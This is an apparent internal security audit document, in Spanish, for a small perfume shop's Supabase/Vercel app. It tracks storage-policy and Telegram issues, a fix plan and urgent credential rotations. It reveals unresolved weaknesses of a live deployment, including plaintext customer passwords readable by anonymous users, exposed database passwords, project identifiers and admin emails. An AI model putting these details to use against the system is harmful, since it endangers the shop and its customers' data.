> ✅ **ESTADO: RESUELTO 23-sep-2026** (`[S8-STORAGE-ANON]`). **Qué era:** con la clave pública cualquiera podía subir, pisar, borrar y listar las fotos del bucket, que no tenía copia. **Cómo se cerró:** primero el backup local (165/165 objetos, 8.689.933 bytes, sha256 en `manifest.json`); después el SQL de Alejo, que deja **sólo a las dos cuentas del panel, por email**, leer el listado, subir y actualizar, y **a nadie borrar** (el panel no borra del storage). El bucket sigue público: las fotos se sirven por su URL sin pasar por las políticas.
> **Verificado:** en `storage.objects` quedan exactamente 3 políticas (`fotos_staff_select`, `fotos_staff_insert`, `fotos_staff_update`), las tres `{authenticated}` con el filtro por email, y ninguna otra; listar como `anon` → `[]`; 3 fotos al azar por URL pública → 200; Alejo subió una foto desde el panel y anduvo.
>
> Lo que sigue abajo es el análisis original de mayo, ya cerrado.

**Severidad:** 🟢 MEDIA · permite anon upload/delete.

**Donde está:**
- `storage.objects` policies del schema `storage`:
  - `Upload fotos anon` · INSERT TO anon, authenticated
  - `Delete fotos anon` · DELETE TO anon, authenticated
  - `anon puede actualizar fotos perfumes` · UPDATE TO anon, authenticated

**Riesgo real:**
- Un atacante anónimo podría subir/borrar fotos del bucket
- En la práctica, requiere conocer el anon key (que está en el HTML público)
- Combinado con la flexibilidad de filename (sin sanitización), un atacante podría sobreescribir fotos legítimas con fakes

**Por qué se hizo así:**
- El admin sube fotos sin estar logueado en Supabase Auth (usa custom auth de tabla clientes para login admin · pero el INSERT al bucket se hace con anon key del cliente Supabase)
- Por eso las policies permiten anon

**Fix recomendado:**
- Migrar el flow de upload del admin a usar Supabase Auth (que las chicas estén loggeadas en `auth.users` cuando suben fotos)
- Restringir policies a `TO authenticated` solamente
- Agregar check de filename: `bucket_id = 'perfume-fotos' AND name ~ '^[a-zA-Z0-9_-]+\.webp$'` (whitelist)

---

### **S9 · `notifyTelegram` antes del Plan B era estable; post-Plan-B está roto**

**Severidad:** 🟢 MEDIA · funcionalidad rota, no es vulnerabilidad.

**Estado:** `[FIX-TELEGRAM-PG-NET]` pendiente (Task #26). pg_net habilitada en proyecto nuevo pero el worker no procesa requests.

**Workaround propuesto:**
- Cambiar `notifyTelegram` a `fetch` directo desde frontend (riesgo: token expuesto · ver S3 · se decidirá en `[SECURITY-AUDIT-S1]`)
- O diagnosticar y arreglar config de pg_net

---

## ✅ Lo que SÍ está OK (no tocar a la ligera)

| Cosa | Estado |
|---|---|
| Auth de admin via Supabase Auth | ✓ Funciona post Plan B (hashes bcrypt preservados) |
| RLS pública en tablas (`select_public USING true`) | ⚠️ Configurado en las 28 tablas · OK para el catálogo, **pero en `clientes` filtra teléfonos + passwords en plano a `anon`** (ver addendum de S2) · NO es "OK" para esa tabla |
| RLS escritura `auth.role() = 'authenticated'` | ✓ Configurado |
| Service role keys NO en frontend | ✓ Solo en env vars o `.env` local (borrado) |
| HTTPS en producción | ✓ Vercel auto |
| Storage CDN cache | ✓ 1 semana (`[CACHE-CONTROL-1W]`) |
| Service Worker · no cachea Supabase API | ✓ Configurado (`network-only` para `*.supabase.co`) |
| `perfume_clicks_resumen()` con `EXECUTE` para `anon` (`[CLICKS-RESUMEN]`, 20-sep-2026) | ✓ A propósito — `SECURITY DEFINER`, devuelve sólo `(slug, clicks)` agregado por `GROUP BY`, nunca las filas crudas de `perfume_clicks`. Existe porque la RLS de `SELECT` de esa tabla exige `authenticated` y el catálogo público necesita el conteo agregado para ordenar "más visitados". Verificado en producción: `anon=true`, `authenticated=true`, `public=false`. Detalle en `docs/DATABASE.md`. |
| `lista_espera_pendientes()` con `EXECUTE` para `anon` (`[ESPERA-SEGURA]`, 23-sep-2026) | ✓ A propósito — `SECURITY DEFINER`, devuelve sólo los slugs **pendientes** de un teléfono y valida `^[0-9]{8,15}$`; es lo único que el catálogo lee de `lista_espera` |
| `.vercelignore` (`[DOCS-PUBLICOS]`, 23-sep-2026) | ✓ Docs, SQL, memoria, herramientas y `*.md` fuera del deploy — verificado con 404 |
| Registro de Supabase Auth apagado (`[SIGNUP-ABIERTO]`, 23-sep-2026) | ✓ `disable_signup: true`; las cuentas del panel se crean a mano |
| Bucket `perfume-fotos` (`[S8-STORAGE-ANON]`, 23-sep-2026) | ✓ Escriben y listan sólo las dos cuentas del panel (por email); nadie borra; las fotos se sirven por URL pública |

---

## 📋 Estado actual del proyecto post-Plan-B

| Item | Detalles |
|---|---|
| **Proyecto Supabase activo** | sa-east-1 São Paulo · ref `znmjhproimtprptheumy` |
| **Proyecto Supabase legacy** | us-west-2 Oregon · ref `rtgjzzkjrwbkdhkslxix` · activo hasta 28-may como rollback |
| **Anon key activa** | `sb_publishable_Bb4Jo74f4Wh7vhz...` (nuevo formato Supabase, ~46 chars) |
| **DB password expuesta** | ⚠️ Sí · ambas en chat de esta sesión. Reset pendiente |
| **Bot Telegram token** | **Rotado el 19-sep-2026 y verificado por entrega (`200` en `pg_net`)** · el del 17-sep quedó mal pegado (404, nada se entregó ~31 h) y además salió en una captura → rotado de nuevo · vive sólo en `public.send_telegram` · `anon` sin EXECUTE (S14 ✅) · pendiente Vault |
| **Service role keys** | NUNCA en repo · estuvieron en `D:\tmp\.env` (borrado) |
| **Backup dump pre-migración** | `D:\backups\st-perfumeria-pre-migracion-20may2026.sql` · 6.2 MB · conservar 7 días · contiene passwords en plano de clientes |

---

## 📅 Plan de acción priorizado · `[SECURITY-AUDIT-S1]`

**Próxima sesión (1-2 días desde hoy):**

1. **Sesión Claude↔Claude:**
   - Alejo abre ClaudeChat con este SECURITY.md como contexto
   - ClaudeChat hace análisis profundo y propone plan de fix para cada issue (priorizado)
   - ClaudeChat escribe `Prompt_para_ClaudeCode_SECURITY_AUDIT_S1.md` (similar al de Plan B)
   - Alejo valida el plan
   - Claude Code ejecuta paso a paso con disciplina

2. **Fix orden recomendado:**
   - 🔴 **S1 primero** (passwords hardcoded admin) · cualquier hora · 30 min
   - 🟡 **S3 después** (rotar bot token Telegram) · 15 min
   - 🟡 **S5** (rotar DB passwords expuestas) · 5 min cada una
   - ✅ ~~**S2 (BCRYPT-MIGRATION)**~~ · **RESUELTO 17-sep-2026** (`98b556c` + FASE 1/3) · ver § S2
   - 🟡 **S4** se resuelve automáticamente al bajar proyecto viejo el 28-may
   - 🟢 **S8** (storage policies) · puede ir junto con BCRYPT-MIGRATION

3. **Verificación post-fix:**
   - Test E2E del admin con las passwords nuevas
   - Test E2E del frontend público
   - Confirmar que `notifyTelegram` sigue funcionando con el token nuevo (o ya con el workaround del `[FIX-TELEGRAM-PG-NET]`)
   - Revisar logs de Vercel y Supabase por errors anómalos

---

## 🚨 Acciones URGENTES Alejo puede hacer YA (sin sesión Claude)

Estas son cosas que podés hacer vos solo desde la UI · 5-10 min total:

1. **Cambiar password del jefe en `auth.users` del proyecto nuevo**:
   - `https://supabase.com/dashboard/project/znmjhproimtprptheumy/auth/users`
   - Click en `jefe@stperfumeria.local` → "..." → "Send password recovery" (no funciona porque no hay email real) → mejor: "Change password" directo · poner nueva
2. **Mismo para `empleado@stperfumeria.local`**
3. **Avisar a las chicas las passwords nuevas** por canal privado (WhatsApp directo, NO email)
4. **Resetear DB password de ambos proyectos** (Settings → Database → Reset) · ~30 seg cada uno
5. **Revocar bot Telegram con BotFather**:
   - Abrir Telegram → buscar `@BotFather`
   - `/mybots` → seleccionar tu bot ST Perfumería → "API Token" → "Revoke current token"
   - Te da un token nuevo · pegarlo en la función SQL `send_telegram` del proyecto nuevo (via SQL Editor)

Esto **mitiga 4 de los 6 issues críticos/altos** en 10 min de trabajo manual.

---

*Documento creado el 21-may-2026 · actualizar cada vez que se descubra/arregle un issue de seguridad · todos los keywords con corchetes deben estar también en HISTORIA.md*
